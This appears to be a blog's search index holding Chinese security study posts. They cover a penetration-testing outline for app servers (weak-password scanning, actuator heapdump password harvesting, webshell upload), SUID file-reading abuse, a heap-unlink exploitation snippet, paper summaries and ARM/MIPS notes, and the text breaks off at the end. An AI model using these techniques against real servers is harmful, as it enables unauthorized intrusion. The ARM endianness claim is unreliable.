<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>渗透测试相关</title>
    <link href="/2025/01/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/"/>
    <url>/2025/01/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试方法梳理"><a href="#渗透测试方法梳理" class="headerlink" title="渗透测试方法梳理"></a>渗透测试方法梳理</h1><p>最近对刚刚开始接触的渗透测试方法进行一些梳理，之前基本都在做二进制安全，刚刚开始接触web安全如堕五里雾中，遂来总结一下我所理解的（尤其是针对移动端App服务器）的渗透测试方法。</p><h3 id="App运行"><a href="#App运行" class="headerlink" title="App运行"></a>App运行</h3><p>由于目标和常规的网站不同，首先我们要确保App要能在可控的环境中运行起来。由于要对App进行中间人抓包，我们就需要向安卓模拟器中装入系统CA证书，需要有root环境。我这里使用的是狐狸面具+magisk+burpsuite。</p><p>由于还会需要对App进行一些动态的debug或者frida hook，所以root环境不能关掉。有一些App会检测root环境，这里就需要定位检测的Activity，找到对应的检测的samli代码，将其分支判断逻辑进行修改。有时候进行修改后还会导致App完整性校验失败，那还需要再对完整性校验的代码进行一轮修改。</p><p>除此之外，也可以利用frida hook把这些检测的方法返回值进行动态修改。这里如果有一些企业级加壳并且检测root的方法，还需要先脱壳再进行逆向或者运行，暂时还没有遇到，这种情况就比较棘手了。</p><h3 id="抓包确定服务器资产"><a href="#抓包确定服务器资产" class="headerlink" title="抓包确定服务器资产"></a>抓包确定服务器资产</h3><p>通常情况下来说装入证书就可以抓取https的包了，但我们还有遇到使用flutter框架（使用reflutter在二进制层面重写代理服务器）&#x2F;本地代理（本地抓包）等方法干扰抓包的，这些都可以经过逆向分析逐步解决，最终可以确定服务器域名&#x2F;IP以及访问的URL等等信息。（我把他们归类为可解决问题，因为代码在本地，总是可以一步一步逆向出来的）</p><h3 id="如何攻入服务器（RCE）？"><a href="#如何攻入服务器（RCE）？" class="headerlink" title="如何攻入服务器（RCE）？"></a>如何攻入服务器（RCE）？</h3><p>当有了服务器的域名或者IP以后，就需要利用各种渠道获得服务器的信息，进而寻找有可能在服务器上执行任意代码的能力。以我目前的了解来说，首先</p><ol><li>我们可以进行端口扫描，尝试对一些服务进行弱口令扫描如ssh（22），mysql（3306），mysqlx（33060），redis（6379）（redis里面可能会存储后台的cookie，redis本身也可以被利用进行rce）</li><li>使用dirb，dirsearch等工具对服务器web端口进行路径扫描，尝试寻找其后台，后台再尝试弱密码或者已知漏洞<ol><li>如果可以登陆进入后台，再利用后台本身的功能或者漏洞获得shell任意代码执行能力</li><li>如果没法通过弱密码登陆进后台，那可以试试未鉴权的页面&#x2F;cookie生成的方式&#x2F;网站可能会把git源代码等信息泄漏，去进行源码漏洞挖掘<ol><li>如果站点使用了sprintboot来进行搭建，可以在url后门拼接&#x2F;druid&#x2F;试试未授权访问，druid里面也可能会存储后台登录的cookie。</li><li>也可以尝试&#x2F;actuator尝试未授权访问，利用env&#x2F;heapdump可以获取服务器内存中明文存储的一些密码。</li><li>可以对xxl-job-admin服务尝试，这种可以直接获得shell命令的执行权限。</li><li>尝试&#x2F;doc.html或者swagger服务可以获取后台的接口文档。</li></ol></li></ol></li><li>寻找文件上传点，如果能上传文件可能有机会去写入一个木马，获得shell，这里一般是上传头像功能？或者实名验证</li><li>sql注入，我目前还没有遇到一些简单的写单双引号就可以报错的情况，这里我不清楚还有什么快速检测注入的方法<ol><li>如果有搜索的情况，可以试试%或者%25（编码后的%）是一个通配符</li><li>针对一些整数数字的部分，可以试试负数，小数，字符串等等</li></ol></li></ol><p>如果上述方法都不行，那还有什么机会呢？（这类问题我归类为不一定可以解决的问题，因为服务器本身对我们来说是个黑盒，我们没有对其进行逆向分析与漏洞挖掘的条件，只是试错而已）</p><p>（待补充）</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RIoTFuzzer:远程IoT设备模糊测试方法</title>
    <link href="/2025/01/08/RIoTFuzzer-%E8%BF%9C%E7%A8%8BIoT%E8%AE%BE%E5%A4%87%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/"/>
    <url>/2025/01/08/RIoTFuzzer-%E8%BF%9C%E7%A8%8BIoT%E8%AE%BE%E5%A4%87%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="RIoTFuzzer-Companion-App-Assisted-Remote-Fuzzing-for-Detecting-Vulnerabilities-in-IoT-Devices-CCS’24"><a href="#RIoTFuzzer-Companion-App-Assisted-Remote-Fuzzing-for-Detecting-Vulnerabilities-in-IoT-Devices-CCS’24" class="headerlink" title="RIoTFuzzer: Companion App Assisted Remote Fuzzing for Detecting Vulnerabilities in IoT Devices (CCS’24)"></a>RIoTFuzzer: Companion App Assisted Remote Fuzzing for Detecting Vulnerabilities in IoT Devices (CCS’24)</h1><p>这篇文章是刘凯铮博士和本科时候的启蒙老师凌振老师团队所做，之前有过IoT设备的研究经历，和当前的工作内容也相对符合，所以这篇适合进行精读。</p><p>本文章主要讲的是针对IoT设备（文中主要针对的是家用的智能家居设备如灯泡，智能插座，摄像头等等）进行协议层面的fuzz方法。与本地的fuzz不同，文章主要针对的是远程App控制命令的fuzz，也就是说，这些fuzz的报文都是由控制App发出，通过了服务器进行转发，再发送至设备上，所以叫R(emote) IoTFuzzer。这其中势必会用到针对安卓App的逆向分析，这里作者发现很多App都是用了基于JavaScript的mini-App，这当然就增加了逆向的难度（传统的针对java的方法没法直接用在这里）。最终作者通过对27个IoT设备进行模糊测试，找到了11个0day漏洞。</p><h3 id="Motivation："><a href="#Motivation：" class="headerlink" title="Motivation："></a>Motivation：</h3><ol><li>当前通过控制App针对IoT设备的fuzz方法都是在本地进行的，也就是在同一个局域网内部进行fuzz；但作者发现很多的IoT设备只能通过远端服务器进行访问。有一些IoT设备有本地局域网和远程两种控制方式，但他们在设备端的实现是不同的，所以远程访问是一个很值得去研究的范畴。</li><li>现有的黑盒测试方法主要都针对安卓原生的Java实现，但是对新型的JS实现的mini-App支持不够好，这样的话就很难找到数据源，从而难以进行数据的变异等fuzz操作。</li></ol><h3 id="Threat-d-Model"><a href="#Threat-d-Model" class="headerlink" title="Threat(d) Model:"></a>Threat(d) Model:</h3><p>这里作者应该是要写威胁模型，结果一个小typo给写成了线程模型。</p><img src="/2025/01/08/RIoTFuzzer-%E8%BF%9C%E7%A8%8BIoT%E8%AE%BE%E5%A4%87%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/typo.png" class="" title="typo"><p>因为是远程fuzz，所以作者假设的威胁模型是进行注册过的合法设备用户，要不然应该很难过云端的校验（除非你能重绑定或者越权，当然这是后序的工作了）。</p><h3 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges:"></a>Challenges:</h3><p>这里作者提出了这个工作的三大挑战：</p><ol><li>本次测试为黑盒测试，那么很难实现高的代码覆盖率，IoT设备对我们来说都是黑盒，根本就没法去监控。现有的方法一般是通过把App这边的控制指令进行更广泛的触发来追求设备端的代码覆盖率，有一些工作通过对安卓UI上的控件进行模拟点击或者重放，或者手动去点击，但这些方法都有点笨&#x2F;慢。</li><li>现在很多控制App都是多合一App，也就是说base是拿java写的，上面的多个Mini-App都是拿JS写的（类似微信小程序这种的吧），这样就很难去追溯或者去构造一个fuzz包的数据源，JS还很容易去混淆，就是难上加难</li><li>由于是黑盒fuzz，这些发出去的包都要经过云服务器，那势必云服务器会对这些非法的包进行一些过滤，那怎么判断是否进行了过滤从而提高效率呢？</li></ol><h3 id="Method："><a href="#Method：" class="headerlink" title="Method："></a>Method：</h3><img src="/2025/01/08/RIoTFuzzer-%E8%BF%9C%E7%A8%8BIoT%E8%AE%BE%E5%A4%87%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/method.png" class="" title="method"><ol><li>使用了两种方法进行了控制指令的提取。第一种是从供应商官方的文档搜索引擎进行提取、第二种通过抓包手机App与服务器之间的通讯流量提取，然后手动修补一些遗漏的。</li><li>找到可以进行数据变异的点。这里首先是要静态方法识别出Java层接受JS层输入的一个边界函数，再使用动态的方法确定精确的变异点。这里还用到了大语言模型来帮助过滤一些边界函数，从而可以确定真正的变异点。</li><li>利用侧信道的方法来获取服务器的验证结果。如果一个包变异以后没有通过服务器的校验，那他就不会被转发到设备端，这样这个请求所花的时间就比较短，如果走了设备端时间比较长，所以可以使用时间信息来判断是否能通过服务器的校验。这里针对整数，浮点数，布尔变量，以及字符串设定了一些变异的规则。</li><li>通过对IoT设备端端一些网络抓包，ping等等来判断设备是否挂掉了。</li></ol><h3 id="Evaluation："><a href="#Evaluation：" class="headerlink" title="Evaluation："></a>Evaluation：</h3><img src="/2025/01/08/RIoTFuzzer-%E8%BF%9C%E7%A8%8BIoT%E8%AE%BE%E5%A4%87%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/evaluation.png" class="" title="evaluation"><p>作者针对四个平台（小米，华为，京东，还有一个Tuya）的27个设备进行了分析（工作量确实够大，这种带逆向和人为分析的，似乎只有大工作量才算足够的创新），为了防止被云服务器封禁，他们的fuzz速度是10-15s一次，最终他们找到了11个漏洞，后面还做了一个case study和baseline study。</p><img src="/2025/01/08/RIoTFuzzer-%E8%BF%9C%E7%A8%8BIoT%E8%AE%BE%E5%A4%87%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/devices.png" class="" title="devices"><p>看这一地的物联网设备，让我想起了N年前分析海尔摄像头的时光，那时候我家也差不多有10台摄像头排排站。由于之前在团队工作的经历，看这篇文章的时候还是非常亲切的，一些实验方法甚至文章用词，都让我觉得似乎在哪里见过。放一张当时的照片吧。</p><img src="/2025/01/08/RIoTFuzzer-%E8%BF%9C%E7%A8%8BIoT%E8%AE%BE%E5%A4%87%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/geekpwn.jpg" class="" title="geekpwn">]]></content>
    
    
    
    <tags>
      
      <tag>Binary Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PackGenome:Windows加壳程序分析</title>
    <link href="/2025/01/08/PackGenome-Windows%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    <url>/2025/01/08/PackGenome-Windows%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="PackGenome-Automatically-Generating-Robust-YARA-Rules-for-Accurate-Malware-Packer-Detection-CCS’23"><a href="#PackGenome-Automatically-Generating-Robust-YARA-Rules-for-Accurate-Malware-Packer-Detection-CCS’23" class="headerlink" title="PackGenome: Automatically Generating Robust YARA Rules for Accurate Malware Packer Detection (CCS’23)"></a>PackGenome: Automatically Generating Robust YARA Rules for Accurate Malware Packer Detection (CCS’23)</h1><p>主流的加壳检测方法都是基于YARA规则的。用于检测的YARA规则之前主要是人工进行逆向分析生成的，文章提出了一种自动化生成YARA规则的检测程序加壳方法。从文章的名字可以看出，其利用了软件基因方法来识别壳程序，此方法在各个指标性表现均超过了SOTA。</p><h3 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation:"></a>Motivation:</h3><p>之前检测加壳程序的YARA规则主要由人工分析，专家经验生成，但是这种分析有3个弊端：</p><ol><li>人工付出的时间精力成本过高，一些复杂的加壳程序需要花费有经验的逆向分析人员N个人日（1&lt;N&lt;30)</li><li>规则的产生主要依赖于人为经验，但这种经验很容易被进行针对性对抗与伪装</li><li>如果有花指令，那么人为生成的YARA规则会产生较高的假阳性（人为产生的yara规则不够全面与完善）</li></ol><h3 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge:"></a>Challenge:</h3><p>提取加壳程序的YARA规则有如下困难：</p><ol><li><p>对于检测加壳程序的YARA规则生成，没有一个标准的guideline，人为经验不可靠（没有方法论）</p></li><li><p>这些生成的规则很可能匹配到一些不相关的指令，从而造成误报</p></li></ol><h3 id="Method："><a href="#Method：" class="headerlink" title="Method："></a>Method：</h3><img src="/2025/01/08/PackGenome-Windows%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/workflow.png" class="" title="workflow"><p>针对这几个问题，packgenome做了针对性的改进：</p><ol><li><p>首先收集大量的加壳程序，并根据使用的加壳方法进行分类，收集每一种加壳方法下的程序的静态信息，节段信息，指令，基本块，熵等</p></li><li><p>针对每一种加壳方法，进行基因提取。例如，针对A类加壳方法，收集多个使用A类加壳方法加固的程序，然后使用动态二进制分析工具（作者使用了intel pin tool）来进行基本块级别的动态的信息搜集，包括执行的内存地址，指令字节码，以及label。动态收集的基本块集合与静态的基本块集合的交集就是packer程序部分（这部分用来做基因提取&#x2F;特征提取）。其次，将符合“写-然后-执行”的区域进行标记，这部分就是packer解包出来的真正的程序</p></li><li><p>将使用同一个加壳方法A的packer程序部分进行各种粒度的比对，最终相似的部分被认为是packer A的基因</p></li><li><p>用相似性分析的方法结合加壳方法A的基因生成YARA规则</p></li><li><p>再用一些反汇编的方法去除一些非常规的指令，也就是避免假阳性，因为作者这个工具主要针对的是x86&#x2F;x64这种变长指令集，所以需要看看是不是一个mismatch还是真实的反汇编指令。如图：</p><img src="/2025/01/08/PackGenome-Windows%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/mismatch.png" class="" title="mismatch"></li></ol><p>这种方法比SOTA各方面均胜出，0假阴性，低假阳性，有一些运行时的overhead增加。已经开源在 <a href="https://github.com/packgenome/PackGenome-Artifacts">https://github.com/packgenome/PackGenome-Artifacts</a> 里面还包括了各种加壳程序与基因的数据集。</p><h3 id="Take-away"><a href="#Take-away" class="headerlink" title="Take away:"></a>Take away:</h3><p>看起来作者使用的intel pin tool是一个很不错的动态运行分析工具，我之前没有接触过，动态进行漏洞检测&#x2F;<strong>代码相似性检测</strong>的时候可以用一下这种方法，搜集一些动态运行时候的各种信息，理论上使用qemu应该也可以做到类似的功能，只是使用指令翻译TCG会带来额外的性能开销。</p><h3 id="为什么重新开始写"><a href="#为什么重新开始写" class="headerlink" title="为什么重新开始写"></a>为什么重新开始写</h3><p>最近越来越意识到每天的工作似乎都是一些工程方面的实践，虽也能学到一些新东西，但总不如读书来得系统（尤其是用了GPT以后的工作流，全都是细枝末节的输入）。所以打算多花时间进行一些输入，不论是文学类的书籍还是科学论文，都应该多进行输入。我想这样才能在日后有足够的知识储备进行输出。现在的目标是每天读一篇论文，先从安全四大顶会开始读起，根据自己的兴趣和与工作的相关程度我会进行精读或者略读，这篇文章是一篇略读文章。计划保持在每天读一篇，写一篇的状态，大概用一个小时到一个半小时，但如果某一天是在没有时间去读也没关系（毕竟上一次更新已经是23年5月还在找工作背面经的时候），take it easy～</p><img src="/2025/01/08/PackGenome-Windows%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/lastupdate.png" class="" title="lastupdate">]]></content>
    
    
    
    <tags>
      
      <tag>Binary Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>program misuse</title>
    <link href="/2023/02/13/program-misuse/"/>
    <url>/2023/02/13/program-misuse/</url>
    
    <content type="html"><![CDATA[<p>一些程序，如果他们被设置了SUID位，那么他们将拥有特权权限，我们可以利用这些程序来读取被保护的文件。例如： <code>cat</code>, <code>vim/vi/emacs</code>, <code>less/more</code>, <code>head/tail</code>, <code>gzip/zip/tar/ar/cpio</code>, <code>base32/base64</code>, <code>split/sort</code>, <code>od/xxd</code><br>实际上有非常多的命令可以被用来读取文件。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ARM/MIPS指令集知识</title>
    <link href="/2022/08/12/ARM/"/>
    <url>/2022/08/12/ARM/</url>
    
    <content type="html"><![CDATA[<h3 id="ARM指令集知识"><a href="#ARM指令集知识" class="headerlink" title="ARM指令集知识"></a>ARM指令集知识</h3><p>ARM指令属于精简指令集，指令数目较少，操作也更为原子化&#x2F;简单。Arm架构分为两种模式，ARM模式和Thumb模式，ARM指令为固定长度的4字节，Thumb的代码一般为2字节&#x2F;也存在4字节的指令。Thumb代码不具有完整的体系架构，只支持通用功能，必要时需要借助Arm指令。从Arm模式下，可以使用 <code>BX(Branch and Exchange)</code> 或 <code>BLX(Branch, Link and Exchange)</code> 来跳转至Thumb指令中开始执行，注意跳转到的目的地址需要比实际地址+1，这样并不会造成地址不对齐，这是跳转Thumb执行的规定。此外，ARM一般为大端序。</p><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>ARM指令集有共有37个寄存器，其中6个状态寄存器。有16个用户层可以访问和控制的寄存器，分为两组，通用寄存器和有特殊用途的寄存器。其中 <code>R0</code> - <code>R10</code> 为通用型寄存器，其余六个有特殊用途：</p><table><thead><tr><th>寄存器</th><th align="left">别名</th><th align="left">用途</th></tr></thead><tbody><tr><td>R11</td><td align="left">FP(Frame Pointer)</td><td align="left">栈帧指针</td></tr><tr><td>R12</td><td align="left">IP</td><td align="left">内部程序调用</td></tr><tr><td>R13</td><td align="left">SP(Stack Pointer)</td><td align="left">栈指针</td></tr><tr><td>R14</td><td align="left">LR(Link Register)</td><td align="left">链接寄存器（一般存放函数的返回地址）</td></tr><tr><td>R15</td><td align="left">PC(Program Counter)</td><td align="left">程序计数寄存器</td></tr><tr><td>CPSR</td><td align="left">-</td><td align="left">当前程序状态寄存器</td></tr></tbody></table><p>在通用寄存器中，<code>R0</code> - <code>R3</code> 用来保存函数调用时的前四个参数，如果有更多的参数，需要保存在栈上。</p><h4 id="指令特点"><a href="#指令特点" class="headerlink" title="指令特点"></a>指令特点</h4><p>Arm程序的指令都支持条件执行，也就是一条指令会通过判断标志位来决定是否执行，这样减少了不必要的分支指令，增加的代码密度。</p><table><thead><tr><th align="left">指令</th><th align="left">含义</th><th align="left">指令</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">MOV</td><td align="left">移动数据</td><td align="left">EOR</td><td align="left">异或</td></tr><tr><td align="left">MVN</td><td align="left">取反码移动数据</td><td align="left">LDR</td><td align="left">加载数据</td></tr><tr><td align="left">ADD</td><td align="left">数据相加</td><td align="left">STR</td><td align="left">存储数据</td></tr><tr><td align="left">SUB</td><td align="left">数据相减</td><td align="left">LDM</td><td align="left">多次加载</td></tr><tr><td align="left">MUL</td><td align="left">数据相乘</td><td align="left">STM</td><td align="left">多次存储</td></tr><tr><td align="left">LSL</td><td align="left">逻辑左移</td><td align="left">PUSH</td><td align="left">压栈</td></tr><tr><td align="left">LSR</td><td align="left">逻辑右移</td><td align="left">POP</td><td align="left">出栈</td></tr><tr><td align="left">ASR</td><td align="left">算术右移</td><td align="left">B</td><td align="left">分支跳转</td></tr><tr><td align="left">ROR</td><td align="left">循环右移</td><td align="left">BL</td><td align="left">链接分支跳转</td></tr><tr><td align="left">CMP</td><td align="left">比较操作</td><td align="left">BX</td><td align="left">分支跳转切换</td></tr><tr><td align="left">AND</td><td align="left">比特位与</td><td align="left">BLX</td><td align="left">链接分支跳转切换</td></tr><tr><td align="left">ORR</td><td align="left">比特位或</td><td align="left">SWI&#x2F;SVC</td><td align="left">系统调用</td></tr></tbody></table><p>连续存储&#x2F;加载指令：<code>LDM</code> 和 <code>STM</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">IA(<span class="hljs-params">increase</span> <span class="hljs-params">after</span>)</span><br><span class="hljs-constructor">IB(<span class="hljs-params">increase</span> <span class="hljs-params">before</span>)</span><br><span class="hljs-constructor">DA(<span class="hljs-params">decrease</span> <span class="hljs-params">after</span>)</span><br><span class="hljs-constructor">DB(<span class="hljs-params">decrease</span> <span class="hljs-params">before</span>)</span><br></code></pre></td></tr></table></figure><p>后面追加的指令表示是在操作前还是操作后递增&#x2F;递减</p><h3 id="MIPS指令"><a href="#MIPS指令" class="headerlink" title="MIPS指令"></a>MIPS指令</h3><h4 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h4><p>MIPS有32个通用寄存器，用 <code>$0</code> - <code>$31</code> 来表示，也可以用寄存器名称如 <code>$t0</code> <code>$sp</code> 等等来表示。其中 <code>$0</code> 为永零寄存器，其中保存的值永远等于零；<code>$v0, $v1</code> 用来保存函数的返回值，<code>$a0-$a3</code> 用来存放函数的参数；<code>$t0-$t7</code> 为通用临时寄存器，用过之后不需要恢复，<code>$s0-$s7</code> 为保留的临时寄存器，使用完以后需要进行恢；<code>$gp(global pointer)</code> 为全局指针；<code>$sp, $fp</code> 分别为栈指针和栈帧指针；<code>$ra</code> 为返回地址 。还有3个特殊寄存器，为 <code>$pc, $hi, $lo</code> ，其中PC为程序计数器，HI和LO用来保存进行乘除运算时的高位结果和低位结果</p>]]></content>
    
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>interview</title>
    <link href="/2022/07/27/interview/"/>
    <url>/2022/07/27/interview/</url>
    
    <content type="html"><![CDATA[<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="pwn保护机制"><a href="#pwn保护机制" class="headerlink" title="pwn保护机制"></a>pwn保护机制</h4><p>Linux：</p><p>Canary：设置栈cookie 检测栈是否被破坏。</p><p>NX（Non-Execution）：和Windows下的DEP类似，就是将数据所在的内存页标记为不可执行。</p><p>RELRO（Relocation Read Only）：got表不可写。</p><p>PIE（Position Independent Execution）：位置无关的执行，不会有进行绝对地址的跳转，而是通过全局偏移表来进行访存。</p><p>ASLR（Address Space Layout Randomization）根据开启的不同程度，决定栈&#x2F;mmap&#x2F;堆base随机化</p><p>Windows:</p><p>DEP (Data Execution Prevention) 对数据页进行保护，例如存放栈数据的内存页不可以被执行，如果执行的话就会抛出异常。分为软件DEP和硬件DEP；硬件DEP需要CPU支持。和</p><p>SafeSEH（Safe Structured Exception Handler）：是一个编译选项，开启之后在进行Exception Handler的跳转时会首先检验其安全性，例如是否在模块内存范围内，是否在可执行页上等等。</p><p><img src="https://introspelliam.github.io/images/2017-07-07/RtlIsValidHandler.jpg" alt="RtlIsValidHandler校验流程"></p><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>通过溢出栈上的缓冲区从而覆盖栈中的临时变量&#x2F;地址 -&gt; 针对数据流的攻击</p><p>也可以覆盖返回地址，劫持控制流。从针对数据流的攻击变为了针对控制流的攻击</p><p>在Windows下，可以通过栈溢出覆盖异常处理的结构（Structured Exception Handler），当异常被触发时就可以劫持控制流</p><h4 id="C-虚函数漏洞利用-虚函数结构"><a href="#C-虚函数漏洞利用-虚函数结构" class="headerlink" title="C++虚函数漏洞利用 虚函数结构"></a>C++虚函数漏洞利用 虚函数结构</h4><p>在一个类中如果有虚函数，那么内存中就会有一个虚表指针会放在成员变量的上方，如果可以有机会对这个虚表指针进行写入，那么就可以将其指向一个伪造的虚表，从而劫持控制流，虚表指针指向的是虚函数表，这个表里面放的是函数的实际地址，我们也可以修改这个虚函数表的中的项来劫持控制流。</p><h4 id="got-Global-Offset-table-表和plt-Procedure-Linkage-Table-表和延迟绑定"><a href="#got-Global-Offset-table-表和plt-Procedure-Linkage-Table-表和延迟绑定" class="headerlink" title="got(Global Offset table)表和plt(Procedure Linkage Table)表和延迟绑定"></a>got(Global Offset table)表和plt(Procedure Linkage Table)表和延迟绑定</h4><p>got表里面就是全局偏移的地址</p><p>plt是一些代码，有两个功能，如果.got.plt里面已经有地址，那么就去拿到并跳转，如果.got.plt里面没有地址，那么就触发链接器去加载对应的地址。</p><h4 id="ROP（Return-Oriented-Programming）"><a href="#ROP（Return-Oriented-Programming）" class="headerlink" title="ROP（Return Oriented Programming）"></a>ROP（Return Oriented Programming）</h4><p>栈溢出漏洞的一种利用，如果开启了堆栈不可执行，通过跳转至一些以ret结束的代码片段中来执行恶意逻辑，栈中布置了相应的rop链和参数，多个代码片段可能可以保证图灵完整性。</p><h4 id="堆-Heap"><a href="#堆-Heap" class="headerlink" title="堆(Heap)"></a>堆(Heap)</h4><h5 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h5><p>prev_size 如果上一个chunk是释放的，就用来表示其大小，否则用来保存上一个chunk的数据</p><p>size&amp;flag 当前chunk的大小 最后三个bit表示 1是否属于主线程 2是否mmap申请 3上一个chunk是否被使用</p><p>fd下一个chunk bk上一个chunk 仅在释放时有效 如果被申请 那么就时用户内存的一部分</p><p>fd_nextsize 和 bk_nextsize 用于largebin 同样是释放时才有效</p><p><img src="https://s2.51cto.com/images/blog/202108/21/da81163f54aff6dec4483eeed52a5b9e.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=" alt="【pwn】学pwn日记（堆结构学习）_主线程_09"></p><h5 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h5><p>如果我们申请了两个堆块，通过溢出第一个堆块可以覆盖第二个堆size&amp;flag，fd，bk等等结构，当free第一个堆块时，会通过检查下下个堆块的flag来检查第二个是否空闲，我们可以控制第二个堆的size来使得检查通过，那么就会触发unlink宏。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">#!c<br>BK=second-&gt;bk（在例子中bk实际上是shellcode的地址）<br>FD=second-&gt;fd (在例子中fd实际上是<span class="hljs-built_in">free</span>@got的地址 - <span class="hljs-number">12</span>)<br>FD-&gt;bk=BK<br><span class="hljs-comment">/*shellcode的地址被写进了FD+12的位置，但是FD是free@got的地址-12，所以实际上我们已经把shellcode地址写入了free@got*/</span><br>BK-&gt;fd=FD <br></code></pre></td></tr></table></figure><p>这段代码的主要操作是将第二块chunk从链中解除，从而把第一块和第二块合并，将合并后的与第三块相连。</p><p>因为溢出的时候我们可以覆盖第二块的fd，bk，我们就可以使得系统认为第二块是空的，进而完成合并。可以利用这个逻辑来实现任意地址写任意值，例如，可以写got表来使得下次调用某函数时执行shellcode。</p><h5 id="UAF（Use-After-Free）"><a href="#UAF（Use-After-Free）" class="headerlink" title="UAF（Use-After-Free）"></a>UAF（Use-After-Free）</h5><p>使用free函数回收buffer以后，指向该地址的指针是否被重置，如果被重置以后再使用，那程序就会崩溃，如果没有被重置，程序很有可能正常运行，如果后续存在操作使用malloc函数重新分配的空间分配到之前被free回收的buffer区域，那就可以利用填充内容进行恶意操作</p><h5 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h5><p>就是已经free过的一块内存，因为程序的逻辑问题，还可以再free一次</p><p>在第二次free之前可能可以申请一个内存，占用这块空间，在这块空间中布置好虚假的chunk头信息，free触发unlink漏洞</p><h4 id="其他的漏洞"><a href="#其他的漏洞" class="headerlink" title="其他的漏洞"></a>其他的漏洞</h4><p>栈溢出，堆溢出，整形溢出，格式化字符串，系统安全漏洞，竞态条件。。。</p><p>整数溢出：</p><p>正整数的最大值为 0x7fffffff  也就是十进制的 2147483647</p><p>正整数的最小值为 0x00000001 也就是十进制的 1</p><p>0表示为：0x00000000 </p><p>负整数的最大值为 0xffffffff 也就是十进制的 -1</p><p>负整数的最小值为 0x80000000 也就是十进制的 -2147483648</p><h4 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h4><p>向运行中的其他进程强行注入dll文件，用来执行恶意代码</p><p>加载输入表中的dll，修改PE等等</p><p>loadlibrary动态加载，创建新线程，修改eip</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="逆向时常见的文件系统"><a href="#逆向时常见的文件系统" class="headerlink" title="逆向时常见的文件系统"></a>逆向时常见的文件系统</h4><p>linux：ext4，squashfs，cramfs（Read Only），jffs2</p><p>windows：NTFS FAT</p><h4 id="JTAG"><a href="#JTAG" class="headerlink" title="JTAG"></a>JTAG</h4><h5 id="14针"><a href="#14针" class="headerlink" title="14针"></a>14针</h5><p>1 、 13 　 VCC 接电源</p><p>2 、 4 、 6 、 8 、 10 、 14 　 GND 接地</p><p>3 　nTRST 　测试系统复位信号</p><p>5 　TDI 　 测试数据串行输入</p><p>7 　TMS 　测试模式选择</p><p>9 　TCK 　测试时钟</p><p>11　TDO 　 测试数据串行输出</p><p>12　NC 　 未连接</p><h5 id="20针"><a href="#20针" class="headerlink" title="20针"></a>20针</h5><p>1　VTref 　 目标板参考电压，接电源</p><p>2 VCC 　 接电源</p><p>3 nTRST 　 测试系统复位信号</p><p>4、6、8、10、12、14、16、18、20 　GND 接地</p><p>5 TDI 　 测试数据串行输入</p><p>7 TMS 　 测试模式选择</p><p>9 TCK 　 测试时钟</p><p>11 RTCK 　测试时钟返回信号</p><p>13 TDO 　 测试数据串行输出</p><p>15 nRESET 　 目标系统复位信号</p><p>17 、 19 NC 　未连接</p><h4 id="获取设备固件的方法"><a href="#获取设备固件的方法" class="headerlink" title="获取设备固件的方法"></a>获取设备固件的方法</h4><h5 id="网络获取"><a href="#网络获取" 